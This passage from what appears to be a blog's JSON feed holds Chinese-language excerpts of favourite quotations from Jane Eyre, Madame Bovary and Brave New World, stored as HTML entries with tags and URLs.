而且一下子就过去，但毕竟是件主动的事，而我对于完全被动的生活已经感到厌倦。</p>\n<p>我得花点时间，先生，才能给你一个值得你接受的回答。</p>\n<p>先生，光凭你年龄比我大，或者见的世面比我多，你是没有权利来命令我的；你是否有权自称优越，那要看你怎样利用你的岁月和经历了。</p>\n<p>大多数生来自由的家伙为了信奉什么都可以忍受；所以只谈你自己，别去冒险谈什么你全然无知的事物的普遍性吧。</p>\n<p>对于别人的坦白，人们倒往往是用虚伪，冷淡，再不就是愚蠢粗心的误解来报答。</p>\n<h3 id=\"4-104\"><a class=\"markdownIt-Anchor\" href=\"#4-104\">#</a> 4-104</h3>\n<p>你要知道，在你未来的生活中，你将会常常发现自己被不自愿地选为倾听熟人秘密的恶人。人们会像我一样，本能的发现，你的长处不在于谈论你自己，而在于听别人谈论他们自己。</p>\n<p>现在，虽然任何一个堕落的笨蛋说了可鄙的下流话，都会激起我的厌恶，可是我并不能自以为比他好一点，我不得不承认他和我是在同一水平上。</p>\n<p>既然幸福已经从我这里被不可挽回地剥夺了，那我就有权利从生活中寻找乐趣；我要得到它，不管花多大代价。</p>\n<p>我就像任何别的痴情人一样，开始普遍用大家接受的那种方式毁掉我自己。看来，我并没有什么独创性来开辟出一条通向耻辱和毁灭的新路，而是带着愚蠢的准确沿着别人走过的老陆的中心线走去，一英寸也不偏离。</p>\n<p>他们开始谈话；他们的谈话使我完全安下心来：琐琐碎碎、利欲熏心、言不由衷、毫无意义，那只会叫听的人感到厌倦，而不会感到愤怒。</p>\n<p>我相信，比起环境所造就，教育所培养，命运所鼓舞的人来，他生来就有着更好的志向、更高的原则、更纯洁的趣味。我认为，他身上有一些杰出的素质，只是现在有点给糟蹋了，混杂在一起了。</p>\n<p>二十四小时中，只有一个小时她在楼下和她的仆人伙伴待在一起，其余的时间，她都在三楼的一间天花板很低的橡木房间里度过，她在那儿坐着缝纫 – 也许还肚子阴郁的大笑 – 形单影只，就像关在土牢里的囚犯。</p>\n<p>英格拉姆小姐不是一个值得嫉妒的对象，她不配使人产生那种感觉。她喜欢卖弄，可是她没有真才实学；她长的挺美，也有很多花色的技巧，但她的见解浅薄；她并不善良，也没有独特的见解，她常常背诵那些书本上夸张的词句、却从来没有讲过，也不曾有过自己的意见。</p>\n<p>他们是遵照毫无疑问从童年时代起就灌输的那些观念和原则行事。他们那个阶级的人都持有这些原则，我想，他们是有一些我所无法推测的理由来持有这些原则的。</p>\n<p>到庸俗的人们面前来，不是她的天职。</p>\n<h3 id=\"4-105\"><a class=\"markdownIt-Anchor\" href=\"#4-105\">#</a> 4-105</h3>\n<p>那些时髦的人像神灯里的幻影般，在你面前来来去去，你跟他们之间没什么感情交流，仿佛他们只是人形的影子，而不是现实的实体似的。</p>\n<p>如果自尊心和环境需要，我可以一个人生活。我不必出卖灵魂去换取幸福。我生来就有一个内在的宝库，让我能够活着，哪怕一切外在的乐趣会给剥夺，或者只用我出不起的代价，才能获得。</p>\n<p>对我来说，简，活着就是站在火山口的地壳上，它每天都可能裂开，喷出火来。</p>\n<p>痛苦和卑贱的联想成了你回忆的唯一粮食；你四处徘徊，在流浪中寻找安宁，在放荡中的生活寻找欢乐 – 我指的是那种没有爱情而只有肉欲的放荡生活 – 它使你智力迟钝，感情枯萎。</p>\n<p>为了达到这个目的，你是否有理由跳过习俗的障碍 – 一种既不被你的良心所认可，也不被你的判断所同意的传统的障碍？</p>\n<p>没生命的东西都没变，可是有生命的东西却变得认不出来了。</p>\n<p>她似乎不需要同伴，不需要谈话。我相信她是自得其乐的；这种例行工作对她来说已经够了；要是发生任何事情，迫使她打乱那时钟般准确的规律，那可是最叫她烦恼的了。</p>\n<p>她就要执行一个酝酿已久的计划：找一个幽静的住处，让严守时刻的习惯永远不受干扰，还要在她自己和浮华世界之间放一些安全的屏障。</p>\n<p>在尘世间，事情就是这样，刚在一个可爱的休息处安定下来，就有一个声音把你叫起来，要你再往前走，因为休息的时间已经过了。</p>\n<p>最使我塞心的是想起更辽阔的海洋 – 那隔在我同我自然而然地、不可避免地爱着的人中间的财产、地位和习俗。</p>\n<p>你以为我会留下来，成为你觉得无足轻重的人吗？你以为我是一架自动机器吗？一架没有感情的机器吗？能让我的一口面包从我嘴里抢走，让我的一滴活水从我的杯子里泼掉吗？你以为，因为我低微、不美、矮小，我就没有灵魂没有心吗？你想错了！-- 我的灵魂跟你的一样，我的心也跟你的完全一模一样！</p>\n<h3 id=\"4-106\"><a class=\"markdownIt-Anchor\" href=\"#4-106\">#</a> 4-106</h3>\n<p>我现在跟你说话，并不是通过习俗，惯例，甚至不是通过凡人的肉体，而是我的精神在同你的精神说话；就像两个都经过了坟墓，我们站在上帝脚跟前，是平等的 – 因为我们是平等的。</p>\n<p>我知道我的创造者是同意我这样做的。至于世间的评判 – 我可以不管。人们的一间 – 我可以蔑视。</p>\n<p>我将是我自己，你不能指望也不能要求我这儿有什么天堂里的东西 – 因为你得不到的，正如我从你那儿也得不到一样；我压根就不期望这个。</p>\n<p>在她们让我看到平庸、浅薄，也许还有低能，粗俗和暴躁的时候，我完全是个恶魔；可是对于明亮的眼睛，雄辩的舌头，火做的灵魂和既柔和又稳定，既驯服又坚定的能屈而不能断的性格，我却永远是温柔的和忠实的。</p>\n<p>和奉承相比，我可远远地更喜欢鲁莽。我宁可做东西，而不当天使。</p>\n<p>我的原则从来没有受过训练，因为缺少关怀，它们长得有点歪了。</p>\n<p>我不愿陷入感情堕落的境地，我还要用这跟巧辩的针阻止你走近这深渊的边缘；而且凭借他刺痛的帮助，在你我之间保持对彼此都真正有利的距离。</p>\n<p>看着自己所抢的希望，昨天它们还在那样的开着花、发着光，现在却躺在那儿成了直挺挺、冷冰冰、铅灰色的尸体，再也不会复活过来。</p>\n<p>我周围的一切都改变了，先生，我也得改变 – 这是毫无疑问的。</p>\n<p>社交场合里发疯似的竞争、青年人的好色，鲁莽和盲目会促使人什么糊涂的蠢事都干得出来。</p>\n<p>她的趣味引起我的反感，她的心灵平庸、卑鄙、狭窄，特别地不能给引导到任何更高的高度，扩展到任何更广的境界。不管我开始什么话题，都会立即从她那儿听到既粗俗又陈腐，既乖戾又低能的谈话。</p>\n<p>这种世俗状态的痛苦将同现在拖累我灵魂的笨重肉体一起离开我。对于盲信者所受的那种燃烧的永劫，我并不害怕；没有一个未来的状况会比这目前的状况更糟 – 让我离开，回到上帝那儿去吧！</p>\n<h3 id=\"4-107\"><a class=\"markdownIt-Anchor\" href=\"#4-107\">#</a> 4-107</h3>\n<p>我们生来是要斗争，要受苦的 – 你我都一样，那就这样做吧。</p>\n<p>我关心我自己。我越是孤独，越是没有朋友，越是没有支持，我就越尊重我自己。我将遵守上帝颁发，世人认可的法律。</p>\n<p>法律和原则并不是用在没有诱惑的时候，而是用在像现在这样，肉体和灵魂都反抗它们严格的时候；既然他们严格，那就不能违反它们。要是在我自己方便的时候就可以打破它们，那它们还有什么价值呢？</p>\n<p>这条路我从来没有走过，但常常注意到，并且心中琢磨，不知道它通到哪儿去；我就朝哪条路走去。现在不允许思考；也不能往后看一眼；甚至不能往前看。不能想一想过去，也不能想一想未来。</p>\n<p>过去地一页是如此的像天国般甜蜜 – 如此地极度悲哀 – 只消读其中一行就可以使我的勇气消失，使我的力量垮下来。未来却是个可怕的空白，有点儿像洪水过后的世界。</p>\n<p>我是一个人，有人的需要；我不能在没有东西满足这些需要的地方久留。</p>\n<p>然而，生命连同它的一切需要、痛苦和责任，都还为我所有。负担还得背负下去；需要还得满足；痛苦还得忍受；责任还得完成。我出发了。</p>\n<p>人类的生活和人类的劳动就在近旁。我得挣扎着前进；努力向别人一样生活和劳动。</p>\n<p>我并不责怪那些拒绝我的人。我觉得那是意料之中的事，而且是无可奈何的事。一个普通的乞丐往往是怀疑的对象；一个穿着体面的乞丐不可避免的也是这样。固然，我祈求的只是职业；可是谁又有责任来为我提供职业呢？当然不是那些第一次看见我又不了解我品性的人。</p>\n<p>哎，这样孤独 – 这样被从我的同类那儿驱逐！不仅失去了希望之锚，而且也失去了坚韧不拔的这个立足之点 – 至少是暂时的失去；可是，我不就就竭力去恢复这样的立足之点。</p>\n<p>他的眼睛似乎是用来探索别人思想的工具，而不是作为表达自己思想的东西。</p>\n<h3 id=\"4-108\"><a class=\"markdownIt-Anchor\" href=\"#4-108\">#</a> 4-108</h3>\n<p>现在，我只希望有个真正的慈善家让我能找到个我力所能及的工作，我能用他给的酬劳养活我自己，哪怕只拿最小的生活必需品也行。</p>\n<p>如果我因为一阵风或几滴雨就不去干这些轻而易举的工作，这样懒惰，怎么能为我给自己规划的未来作准备呢？</p>\n<p>我意思是说，人类的爱和同情最强有力的控制着你。我肯定，你不可能长久满足于在孤独中打发你的空闲时间，而且工作时间全部都用在毫无刺激的单调的劳动中。</p>\n<p>我周围所见所闻都是无知，贫穷、粗俗，这使我灰心丧气到了无能为力的地步。不过，让我不要为这种感情过于痛恨和蔑视自己吧；我知道这种感情是错误的 – 能知道这点，就已经是取得了一大进步，我将努力克服它们。</p>\n<p>这眼前的生活，短暂的世界，在我看来已经足够了。</p>\n<p>灵魂像磐石般一动不动，牢牢的嵌在汹涌澎湃的海洋深处。要按我的本来面目来认识我，我是个冷酷无情的人。</p>\n<p>我得放纵一下我的感情；我难得有机会这样做。哪怕你辩论、反对、烦扰我一年，我也不会放弃这种美妙的乐趣。</p>\n<p>要达到的目的是，要你利用上帝交托给你的才能；这种才能他肯定有一天会要你作精确的汇报。别顽固地执着于肉体的联系，把你的毅力和热忱留给一种合适的事业吧；千万别把它们浪费在平凡而短暂的事物上。</p>\n<p>对他来说，生活中的人情和乐趣并没有吸引力 – 生活中恬静的享受也没有魅力。从字面上讲，他活着就是为了渴望 – 当然是渴望善良和伟大的东西；可是他永远不会安定下来；也不赞成周围的人安定下来。</p>\n<p>我必须抛掉我的一半天性，扼杀我的一半才能，扭转我的兴趣的原来的趋向，强迫自己从事并不使天生爱好的研究。</p>\n<p>你只要摆脱一切次要的反复无常 – 摆脱一切微不足道的感情上的困难和脆弱 – 摆脱一切有关纯粹个人爱好的程度、种类、力量和温存的顾虑，那你就会立即同意这种结合的。</p>\n<h3 id=\"4-109\"><a class=\"markdownIt-Anchor\" href=\"#4-109\">#</a> 4-109</h3>\n<p>他是个善良的，伟大的人；不过他在追求自己的宏达目的的时候，无情的忘掉了渺小人物的感情和要求了。所以，微不足道的人最好还是避开他；否则，他前进的时候，会把他们踩死的。</p>\n<p>一觉醒来，发现那是个空幻的嘲笑，我孤独，被遗弃 – 我的生活黑暗、寂寞、毫无希望 – 我的灵魂干渴，却给禁止喝水 – 我的心饥饿，却一直得不到食物。温存柔和的梦啊，偎依在我的怀里吧，你也会飞走的。</p>\n<p>什么也不干，什么也不盼；白天黑夜都混在一起，所有的感觉只是在炉火熄灭以后感到冷，在忘记吃东西以后感到饿，接着就是无穷无尽的悲哀。</p>\n<p>他积极的不知疲倦。他活着就是为了要干伟大、崇高的事业。</p>\n<p>我忘了你已经建立了一个新的约束。可是，我不是傻瓜，走。</p>\n<p>时间是无关紧要的，接着发生的才是奇怪的事情。你会认为我迷信 – 我的血液中是有迷信成分，一向有的；然而，这件事却是真实的。</p>\n<p>他踏上了他给自己规定的路，他还是继续在这条路上走着。他在巉岩和危险中工作，再没有比他更不屈不挠，更不知疲倦的先驱了。坚定、忠实、虔诚，充满精力、热情和忠诚，他为他的同类工作。</p>\n<p>这个善良、忠实地仆人终于被召去享受他的主的欢乐。</p>\n",
            "tags": [
                "社会",
                "爱情"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/56%E3%80%8A%E5%8C%85%E6%B3%95%E5%88%A9%E5%A4%AB%E4%BA%BA%E3%80%8B%E7%A6%8F%E6%A5%BC%E6%8B%9C/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/56%E3%80%8A%E5%8C%85%E6%B3%95%E5%88%A9%E5%A4%AB%E4%BA%BA%E3%80%8B%E7%A6%8F%E6%A5%BC%E6%8B%9C/",
            "title": "《包法利夫人》福楼拜",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>他就像蒙住眼睛拉磨的马一样，转来转去也不知道磨的是什么。</p>\n<h3 id=\"5-1\"><a class=\"markdownIt-Anchor\" href=\"#5-1\">#</a> 5-1</h3>\n<p>而她的丈夫却什么也不管，始终一副冰冷的样子，整日像尸体一样僵在床上，醒转来只为对她说些无情无义的话，所在火炉旁边吸烟，向炉灰里吐痰。</p>\n<p>一个个名词他都搞不清楚来龙去脉，看起来好像神庙的大门，里面庄严肃穆，一片黑暗。他什么也不懂，听讲也是白搭，一点也没理解。</p>\n<p>他就像蒙住眼睛拉磨的马一样，转来转去也不知道磨的是什么。</p>\n<p>他的满腔热情不是为了病情严重，就是为了有利可图。到田庄去看病，却给他平淡无奇的生活增添了额外的吸引力。</p>\n<p>但是他表面上虽然百依百顺，内心却不甘心奴颜卑膝，就此屈服，于是他自然地学会了两面派的做法。</p>\n<p>事情就这样过去，越来越远，越埋越深，因为你心里总有一点什么东西留下来，像人说的，一块石头，压着胸口。</p>\n<p>他觉得自己好生凄凉，活像一所空房子；温情脉脉的回忆，忧郁惆怅的思想，交织在他酒醉饭饱、如坠云里雾中的头脑里。</p>\n<p>艾玛竭力想要知道：幸福、热情、陶醉，这些在书本中显得如此美丽的字眼，在生活中到底是什么意思呢？</p>\n<p>她必须从事物得到一种切身利益；凡不能直接发泄她的感情的，她都认为没有用处；她多愁善感，而不倾心艺术，她追寻的是主观的情，而不是客观的景。</p>\n<p>这些平淡无奇的作品，风格庸俗，音调轻浮，却使她隐隐约约地看到了感情世界富有魅力的幻景。</p>\n<p>她感到腻味了，但又不肯承认，先是哀伤成了习惯，后是为了面子，就一直哀伤下去，但是到了最后，说也奇怪，她居然觉得自己恢复平静了，心里没有忧伤，就像额头没有皱纹一样。</p>\n<h3 id=\"5-2\"><a class=\"markdownIt-Anchor\" href=\"#5-2\">#</a> 5-2</h3>\n<p>这样平静的生活，就是她从前朝思暮想的生活。</p>\n<p>她自己也抓不准的苦恼，怎么对人说得清楚？这种苦恼像云一样变幻莫测，像风一样使人晕头转向，她不知怎样去描述，也没有机会和胆量去说。</p>\n<p>经验不到的东西，她没能力了解，正如也没有能力相信不经传统形式的表现的东西一样。感情流露，在他成了例行公事。</p>\n<p>她带着小母狗散步，因为她有时也出去走走，有时也要孤独，避免老看已经生厌了的花园和尘土飞扬的大路。</p>\n<p>他们的眼睛里流露出满不在乎的神情，因为每天的欲望都得到满足，所以心平气和；然而，从他们温文尔雅的外表，也可以看出他们特殊的粗暴本性：他们要控制不难控制的东西，既可显示力量，又可满足虚荣心。</p>\n<p>熙熙攘攘的众生，还是可以分门别类的。艾玛只看到两三类人，就一叶障目，以为他们代表全人类了。</p>\n<p>无论什么东西，如果离她越近，她越懒得去想。眼边的一切，无论是沉闷的田野，愚蠢的小资产阶级，庸俗的存在，她都觉得是世间的特例，一种她不走运，偶然遇见地特殊情况，然而离开现实，浩渺无边，就是广阔的幸福和热情。</p>\n<p>在她的灵魂身处，她一直等待着发生什么事。她睁大一双绝望的眼睛，看着她寂寞的生活，好像沉了船的水手一样，在雾蒙蒙的天边，遥远寻找白帆的踪影。她不知道她期待的是什么机会，也不知道什么风会把机会吹来，把她带去什么海岸。</p>\n<p>失望之下，百无聊赖，她的心又空虚起来了，于是便周而复始地重复这些日子。日复一日，如今仿佛不断头的线，真要永不更改地继续下去，数又数不清，什么也带不来！</p>\n<h3 id=\"5-3\"><a class=\"markdownIt-Anchor\" href=\"#5-3\">#</a> 5-3</h3>\n<p>我相信至高无上的真身，相信造物主，不管他叫什么名字，那都不要紧，反正是他打发我们到世上来尽公民的责任，尽家长的责任的，不过，我犯不着去教堂，吻银盘子，掏空自己的腰包去养肥一大堆小丑。</p>\n<p>你一动不动，就可以神游你想看到的地方，你的思想和小说难解难分，不是亲身体会细节，就是追随故事的来龙去脉。思想和书中人打成一片，似乎是你穿了他们的衣服，在心惊肉跳一样。</p>\n<p>我最讨厌平庸的人物，有节制的感情，那和日常见到的人一样。</p>\n<p>住在这里，远离大世界，不看书还有什么消遣呢。</p>\n<p>现在，他什么也不缺，他认识了人生的整个过程，于是就把胳膊肘凭着人生的餐桌，从从容容地享受人生。</p>\n<p>她既没有活动能力，又得听人摆布，她的性格软弱，只能依靠法律保护。她的愿望就像用绳子系在帽子上的面纱，微风一起，它就蠢蠢欲动，总是受到七情六欲的引诱，却又受到清规戒律的限制。</p>\n<p>他们的眼睛说出来的话还更重要得多。当我们搜索枯肠，说些平淡无奇的话时，他们两人都感到一种忧郁涌上心头，这好像是灵魂的窃窃私语声，深沉悠远，不绝如缕，比说话的声音还更有力量。</p>\n<p>肉体的七情六欲，对金钱的垂涎三尺，还有热情带来的伤感，全都混在一起，成了一种痛苦，而她不但不求解脱，反而自寻烦恼越陷越深。</p>\n<p>在她看来，这种愚蠢的想法，简直是一种侮辱，而他的心安理得，就是无情无义。</p>\n<p>她想努力减轻痛苦，结果反而加重了她的愤怒，因为这种徒劳无益的努力，更增加了她灰心失望的理由，扩大了他们之间的裂痕。</p>\n<p>她于是身不由已，不知不觉去了教堂，准备虔心信教，什么方式也行，只求她的灵魂俯首帖耳，不再有人间的烦恼。</p>\n<p>他是治疗身体的医生，我是拯救灵魂的医生。</p>\n<h3 id=\"5-4\"><a class=\"markdownIt-Anchor\" href=\"#5-4\">#</a> 5-4</h3>\n<p>莱昂对没有结果的恋爱感到厌倦了，再说，他开始觉得毫无变化的生活成了沉重的负担，既没有兴趣来引导，又没有希望来支持。</p>\n<p>最近发生的事情和最远的回忆，感受到的和想象到的，烟消云散了的对肉欲的渴望，像风中枯枝一样摇摇欲坠的如意算盘，没有开花结果的道德观，已经落空了的希望，家庭里的鸡毛蒜皮，她都集笼了，捡起来，加到火堆里去，使她的忧郁变得暖和一点。</p>\n<p>你知道应该怎样对付你的女人。那就是逼她去做事，用两只手干活，要是她像别人一样，必须挣钱过日子，她就不会无所事事，胡思乱想，晕头转向了。</p>\n<p>他的感情越出常轨，艺术对他的专横影响，还总夹杂着某种瞧不起社会习俗的心理。这对人既有吸引力，又使人恼火。</p>\n<p>有些人的灵魂不断受到折磨。他们有时需要理想，又是需要行动，有时需要最纯洁的热情，有时却需要最疯狂的享受，人就是投身于这样各式各样的幻想和怪癖。</p>\n<p>那种瞎了眼睛，有眼无珠的人，我敢说，就是那种陷入偏见，在另一个世纪的偏见中陷的太深，甚至不相信农民有头脑的人。</p>\n<p>职责是要感到什么事伟大的，要热爱一切美丽的，而不是接受社会上的一切陈规陋习，还有社会强加给我们身上的恶名。</p>\n<p>道德有两种。一种是小人的道德，小人说了就算，所以千变万化，叫的最响，动的厉害，就像眼前这伙笨蛋一样。另外一种是永恒的道德，天下地下，无所不在，就像风景一样围绕着我们。</p>\n<p>最高尚的本性，最纯洁的同情，都要受到迫害、污蔑。</p>\n<p>即使世界上死的只剩下他一个人，他也丝毫不会改变他的习惯。</p>\n<p>现在，他身上的一切都惹她生气，他的脸孔，他的衣服，他没有说出来的话，他整个的人，总而言之，他的存在。</p>\n<h3 id=\"5-5\"><a class=\"markdownIt-Anchor\" href=\"#5-5\">#</a> 5-5</h3>\n<p>艾玛和所有的情妇一样，新鲜的魅力和衣服一同脱掉之后，剩下的只是赤裸裸的、单调的热情，没有变化的外形语言。</p>\n<p>他想夸张的语言掩盖着庸俗的感情，听的时候要打折扣。正如充实的心灵有时也会流露出空洞的比喻一样，因为人从来不能准确无误地说出自己的需要，观念、痛苦，而人的语言只像走江湖卖艺人耍猴戏时敲打的锣鼓，哪能妄想感动天上的星辰。</p>\n<p>她的心灵给争强好胜折磨得筋疲力竭，最后才领悟到了基督教的谦逊精神。艾玛尝到了弱者的乐趣，就在自己身上摧毁意志，好空出地盘，让怜悯来占领。原来尘世的幸福之外，还有一种更伟大的幸福。</p>\n<p>一切微笑都掩盖着厌烦的呵欠，一切欢乐下面都隐藏着诅咒，兴高采烈会使人腻味，最甜蜜的吻留在嘴唇上的只是永远得不到满足的淫欲。</p>\n<p>腐化堕落已成习惯，要丢也丢不开；她反倒越陷越深，幻想得到更多的幸福，却把所谴无几的幸福吸允的一干二净了。</p>\n<p>一切都叫她无法忍受，连她自己在内。她恨不得长上两只翅膀，飞到一个遥远的地方去，那里纯洁无瑕的空气能够使她永远青春焕发。</p>\n<p>她心里万念皆空，不再在乎人世的欺诈，卑鄙的行径，折磨她的无数贪欲。现在，她也不恨任何人了；苍茫的暮色笼罩着她的思想，人间的闲言碎语，她能听到的只是这颗痛苦的心发出的悲叹哀鸣，断断续续，温温顺顺，朦朦胧胧，好像交响乐逐渐消失的回声。</p>\n<p>他的妒忌似有似无，已经消失在了无边无际的痛苦中了。</p>\n<p>奥默对有权有势的人低头哈腰。他私下帮助州长大人竞选。他最后卖身投靠，辱没人格，用尽了所有的办法。后来，他得到了他的十字勋章。</p>\n<p>他待在家里什么人也不见，甚至连病人也不去看了。</p>\n",
            "tags": [
                "社会",
                "人性"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/55%E3%80%8A%E7%BE%8E%E4%B8%BD%E6%96%B0%E4%B8%96%E7%95%8C%E3%80%8B%E9%98%BF%E9%81%93%E5%8F%B8%C2%B7%E8%B5%AB%E8%83%A5%E9%BB%8E/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/55%E3%80%8A%E7%BE%8E%E4%B8%BD%E6%96%B0%E4%B8%96%E7%95%8C%E3%80%8B%E9%98%BF%E9%81%93%E5%8F%B8%C2%B7%E8%B5%AB%E8%83%A5%E9%BB%8E/",
            "title": "《美丽新世界》阿道司·赫胥黎",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>这充满危险的生活本身就包含了很有有意义的东西。</p>\n<h3 id=\"4-109\"><a class=\"markdownIt-Anchor\" href=\"#4-109\">#</a> 4-109</h3>\n<p>幸福与品德的秘密，就是喜欢你正在做的事。所有条件设置的最终目的都是：让人们喜欢已经注定的社会命运。</p>\n<p>他们还没能学会区分大众科学与纯粹科学之间重大却也微妙的关系。</p>\n<p>可是不运用语言的条件设置是极其粗陋的，因为没有办法把细微的差别和复杂的行为融合贯通。因此一定要有语言，并且一定是没有借口的语言。</p>\n<p>听起来或许是很难以置信，但是，在你们不了解历史真相的时候，过去的事大多数听起来真让人难以相信。</p>\n<p>所谓家，就是几个小房子，一个男人、一个准备受辱的女人和一群不同年龄的孩子生活在一块，拥挤不堪。没有空气、没有空间、是一个消毒不彻底的牢房，昏暗、疾病，恶臭。</p>\n<h3 id=\"4-110\"><a class=\"markdownIt-Anchor\" href=\"#4-110\">#</a> 4-110</h3>\n<p>世界上因为有了父亲，也就有了痛苦；因为有了母亲，也就有了形式多样的扭曲和矫饰、从淫虐狂到贞操病；世界上因为有了兄弟姐妹、叔伯姑婶，也就有了疯狂和自杀。</p>\n<p>家庭，一夫一妻制、风流韵事…… 这一切都具有强烈的拍他性，冲动和精力全被禁锢在一条狭窄的通道里。</p>\n<p>学生们点头称是，对于在昏暗之中重复了 62000 多遍，让他们接受了的这句话着重表示同意。不仅同意，而且认为是天经地义，不言而喻，毋庸置疑的。</p>\n<p>他们生活的世界就不允许他们舒心、理智、道德和愉快的看待问题。</p>\n<p>有一种被称为民主的东西。似乎人与人之间除了物理和化学性能平等之外，还有别的什么东西也会平等一样。</p>\n<p>他们就知道把她当个肉体来议论。在这儿干她，在那儿干她，似乎她就是一块肉，把她贬低成一大块羊肉。</p>\n<p>你现在需要的是一克嗦麻（一种兴奋剂），它具备了基督教和酒精的所有优点，却把两者的缺点都克服掉了。</p>\n<p>在苦难的年代里，老人总有点消极、退却，沉迷于宗教，靠读书和胡思乱想混时日。然而时代不同了，也就是说社会进步了，老年人依旧工作，依旧性交，拈花惹草，东奔西逃，几乎没有空余的时间坐下来思考。</p>\n<p>每个人都要为每个其他的人工作。没有别的人，什么事单靠我们自己是不行的。</p>\n<p>不管你原来是什么，活着的时候就是幸福的。现在每个人都很幸福。这句话他俩每天要听 150 次，已经听了 12 年。</p>\n<p>因为兴奋意味着没有餍足，而他所得到的确实完成之后的狂欢，心满意足的平静。这平静不是空洞的满足和无聊，而是相对的生命和获得休息与平衡的能量，是一种丰富而生动的平静。</p>\n<p>我宁可做我自己，做一个讨人嫌的自己，也不当别人，不管他们多么快活。</p>\n<p>可是我想看。这让我觉得好像…… 我更像是我自己了。更像是由自己来安排生活，而不仅仅是属于别人，属于一个社会集体的细胞了。</p>\n<h3 id=\"4-111\"><a class=\"markdownIt-Anchor\" href=\"#4-111\">#</a> 4-111</h3>\n<p>现在每个人都很幸福，我们的孩子从 5 岁就这样接受教育。可是，你从来没考虑过从另外一种方式自由地选择幸福吗？比如，以你自己喜欢的方式，而不以其他任何人的方式？</p>\n<p>过去和未来让我心烦，吞下嗦麻只剩下眼前。</p>\n<p>我简直是像和一群疯子生活在一起，他们的行为都像在发疯。</p>\n<p>他们嘲笑他的时候，他就努力地想着读书，用这个来安慰自己，这样他就可以装作不在乎。于是他又开始重复这项活动。</p>\n<p>他一个人被赶到了这充满了像骷髅一样的岩石和惨白月光的世界。他在悬崖边背着月光坐下。他向下看看石源漆黑的影子，那像是死亡的影子。</p>\n<p>原来所谓的永恒只存在于我们的嘴和眼睛里。</p>\n<p>只要社会承认他的重要性，他就觉得社会的一切秩序都是好的。</p>\n<p>他将他的注意力都放在那些他称之为‘灵魂’的东西上，他始终坚持自己的见解，认为那是种完全独立于物质环境之外的东西。</p>\n<p>早期形成的条件反射好像能抑制本性的冲动，甚至克服它。</p>\n<p>在尘世里，他的心被自己心中的那些誓言和一些很久没用的法则所束缚。</p>\n<p>在幸福之外还有别的存在于当前人类社会以外的目的，从而觉得生活的目的不是为了维护福利，而是深入意识及扩大知识。</p>\n<p>如果我是你的话，我宁愿不快活，也不愿意要那种靠行骗得来的快活。</p>\n<p>所谓朋友的主要功能之一就是：我们能将想施加而无法施加于敌人的惩罚加在他们身上，而且他们却能够平静地用一种较为象征性的形式来接受。</p>\n<p>原本就没有什么可以填充这空虚的黑夜，也没有什么比那些跟我们亲密接触的东西更真是的存在，显得更具体 ---- 可是为什么又显得那么污秽呢？</p>\n<p>它们就像一把钻、钻穿了理智；像一条隧道，刺穿了决心。在热血沸腾的欲火面前，那些所谓最坚定的誓言也不过是一蓬干草。</p>\n<h3 id=\"4-112\"><a class=\"markdownIt-Anchor\" href=\"#4-112\">#</a> 4-112</h3>\n<p>他的记忆中完整无缺地记载着 – 那里有关天堂，有关善与美的乐园 – 所有这些并没有因为被现在所接触的真实的世界和那些标榜的文明男女所玷污。</p>\n<p>从那卑贱可怜的回忆里醒来 – 回到这让人生畏、让人厌恶的现实中来 – 可相对于更可怕的死亡来说，那现实又显得崇高、深刻和无比重要了。</p>\n<p>他为他们跟畜生一样的愚昧感到苦恼，但这些咒骂在对方那厚重的蒙昧的甲壳上弹了回来。那些人用一种茫然的目光看着他，里面还夹杂着迟钝和阴沉的仇恨。</p>\n<p>在这儿所有古老东西都是无用的。尤其是那些特别美的东西。因为美具有致命的吸引力，但我们却不希望看到人们沉浸在古老的东西中。我们要追求新的东西。</p>\n<p>意义在于它本身。因为观众毕竟可以从中得到大量的感官享受。</p>\n<p>法纪如同虚设，政令不通，被分配到做低级工作的人总想搞阴谋往上爬。而做高级工作的人则不惜一切代价保住现有职位。</p>\n<p>跟幸福相对的不只是艺术，还有科学。科学也是危险的，我们得像驯马一样给它套上笼头，拴上链子。</p>\n<p>那时的人都认为科学的发展是可以肆无忌惮、无所限制的，知识才是最高的善，真理就是最高的价值，其他的一切都是次要的。从那时起，观念也在悄悄改变。事实上，能让社会的轮子稳定运转的是众人的幸福而不是真与美。</p>\n<p>那些能给感官世界以生命的东西已经被渐渐地远离我们，那惊人的存在就已不再需要内在和外在形象的支持了，我们需要一种永恒的东西来寄托，一种永远不会欺骗我们的东西 – 一种现实，一种绝对的、永恒的真理。于是，我们无可逃避地投向了上帝。</p>\n<p>哲学就是为自己本能所相信的那些东西寻找蹩脚的解释！好像人们的信仰是出于本能！一个人的条件设置决定了他的信仰。</p>\n<p>一个东西的价值是不能光凭个人的喜欢来决定的。而是因为这东西一是本身确有可贵之处，而是评估者的重视。这样它才会有价值。</p>\n<p>这充满危险的生活本身就包含了很有有意义的东西。</p>\n<h3 id=\"4-113\"><a class=\"markdownIt-Anchor\" href=\"#4-113\">#</a> 4-113</h3>\n<p>我需要生活中衰老、丑陋、饥饿、伤病这些丑陋的东西，甚至希望总是在担心明天有不可预知的事情发生，或许还需要遭受种种难以描述的痛苦的折磨。是的，这一切我都要。</p>\n<p>去哪儿都成，无所谓，只要能一个人就行。</p>\n<p>野蛮人正在园子里挖地 – 他是在挖地，同时也是在挖掘自己的内心，苦苦地寻找自己思想的实质。死亡 – 他铲起一铲土，接着一铲又一铲。是的，我们所做的一切，不过是替傻子们照亮通往死亡的路。</p>\n<p>所有的人都在叫喊着，像鹦鹉学舌重复了一遍又一遍。</p>\n<p>有时痛苦在别人眼里是一种迷人的恐怖。</p>\n",
            "tags": [
                "社会",
                "人性"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/47%E3%80%8A%E4%BA%BA%E7%94%9F%E7%9A%84%E4%BB%B7%E5%80%BC%E4%B8%8E%E6%84%8F%E4%B9%89%E3%80%8B%E5%A5%A5%E4%BC%8A%E8%82%AF/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/47%E3%80%8A%E4%BA%BA%E7%94%9F%E7%9A%84%E4%BB%B7%E5%80%BC%E4%B8%8E%E6%84%8F%E4%B9%89%E3%80%8B%E5%A5%A5%E4%BC%8A%E8%82%AF/",
            "title": "《人生的价值与意义》奥伊肯",
